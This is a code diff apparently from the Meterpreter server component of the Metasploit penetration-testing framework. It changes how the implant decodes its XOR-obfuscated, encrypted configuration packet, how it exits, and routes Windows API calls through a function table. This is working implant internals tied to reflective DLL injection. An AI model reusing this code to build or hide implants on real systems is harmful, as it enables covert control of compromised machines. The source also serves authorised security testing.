@@ -17,11 +17,37 @@ HINSTANCE hAppInstance = NULL;
 #include "../ReflectiveDLLInjection/dll/src/DirectSyscall.c"
 #endif
 #include "../ReflectiveDLLInjection/inject/src/GetProcAddressR.c"
-#include "../ReflectiveDLLInjection/inject/src/LoadLibraryR.c"
+// #include "../ReflectiveDLLInjection/inject/src/LoadLibraryR.c"
 
-DWORD Init(MetsrvConfig* metConfig)
+#include "packet_encryption.h"
+
+DWORD Init(MetsrvConfig* config)
 {
-	INIT_LOGGING(metConfig)
+	dprintf("[METSRV] Initializing from configuration: 0x%p", config);
+
+	// take a copy of the packet header so that we can manipulate it locally
+	PacketHeader header = *(PacketHeader*)config->config_packet;
+
+	// decode as it might be xor'd
+	xor_bytes(header.xor_key, (PUCHAR)&header + sizeof(header.xor_key), sizeof(PacketHeader) - sizeof(header.xor_key));
+
+	UINT configLength = met_api->win_api.ws2_32.ntohl(header.length) - sizeof(TlvHeader);
+	UINT configBlockSize = sizeof(PacketHeader) + configLength;
+	dprintf("[METSRV] Config length is %u 0x%08x", configLength, configLength);
+	dprintf("[METSRV] Config block size is %u 0x%08x", configBlockSize, configBlockSize);
+
+	// Get a full copy of the entire packet ready for decoding
+	PBYTE configBuffer = (PBYTE)malloc(configBlockSize);
+	memcpy_s(configBuffer, configBlockSize, config->config_packet, configBlockSize);
+	Packet* configPacket = NULL;
+	dprintf("[METSRV] decrypting config packet");
+	SetLastError(decrypt_packet(NULL, &configPacket, configBuffer, configBlockSize));
+
+#ifdef DEBUGTRACE
+	PWSTR logPath = packet_get_tlv_value_wstring(configPacket, TLV_TYPE_DEBUG_LOG);
+	INIT_LOGGING(logPath);
+	free(logPath);
+#endif
 
 	// if hAppInstance is still == NULL it means that we havent been
 	// reflectivly loaded so we must patch in the hAppInstance value
@@ -30,14 +56,16 @@ DWORD Init(MetsrvConfig* metConfig)
 
 	// In the case of metsrv payloads, the parameter passed to init is NOT a socket, it's actually
 	// a pointer to the metserv configuration, so do a nasty cast and move on.
-	dprintf("[METSRV] Getting ready to init with config %p", metConfig);
-	DWORD result = server_setup(metConfig);
+	dprintf("[METSRV] Getting ready to init with config %p", config);
+	DWORD result = server_setup(config, configPacket);
+	UINT exitFunc = packet_get_tlv_value_uint(configPacket, TLV_TYPE_EXITFUNC);
 
-	dprintf("[METSRV] Exiting with %08x", metConfig->session.exit_func);
+	dprintf("[METSRV] Exiting with %08x", exitFunc);
 
+	packet_destroy(configPacket);
 	// We also handle exit func directly in metsrv now because the value is added to the
 	// configuration block and we manage to save bytes in the stager/header as well.
-	switch (metConfig->session.exit_func)
+	switch (exitFunc)
 	{
 	case EXITFUNC_SEH:
 		SetUnhandledExceptionFilter(NULL);
@@ -45,10 +73,8 @@ DWORD Init(MetsrvConfig* metConfig)
 	case EXITFUNC_THREAD:
 		ExitThread(0);
 		break;
-	case EXITFUNC_PROCESS:
-		ExitProcess(0);
-		break;
 	default:
+		ExitProcess(0);
 		break;
 	}
 	return result;
@@ -89,8 +115,8 @@ int current_unix_timestamp(void) {
 	FILETIME file_time;
 	ULARGE_INTEGER ularge;
 
-	GetSystemTime(&system_time);
-	SystemTimeToFileTime(&system_time, &file_time);
+	met_api->win_api.kernel32.GetSystemTime(&system_time);
+	met_api->win_api.kernel32.SystemTimeToFileTime(&system_time, &file_time);
 
 	ularge.LowPart = file_time.dwLowDateTime;
 	ularge.HighPart = file_time.dwHighDateTime;
@@ -101,16 +127,16 @@ int current_unix_timestamp(void) {
  * @brief Sleep for the given number of seconds.
  * @param seconds DWORD value representing the number of seconds to sleep.
  * @remark This was implemented so that extended sleep times can be used (beyond the
- *         49 day limit imposed by Sleep()).
+ *         49 day limit imposed by met_api->win_api.kernel32.Sleep()).
  */
 VOID sleep(DWORD seconds)
 {
 	while (seconds > SLEEP_MAX_SEC)
 	{
-		Sleep(SLEEP_MAX_SEC * 1000);
+		met_api->win_api.kernel32.Sleep(SLEEP_MAX_SEC * 1000);
 		seconds -= SLEEP_MAX_SEC;
 	}
-	Sleep(seconds * 1000);
+	met_api->win_api.kernel32.Sleep(seconds * 1000);
 }
 
 VOID xor_bytes(BYTE xorKey[4], LPBYTE buffer, DWORD bufferSize)
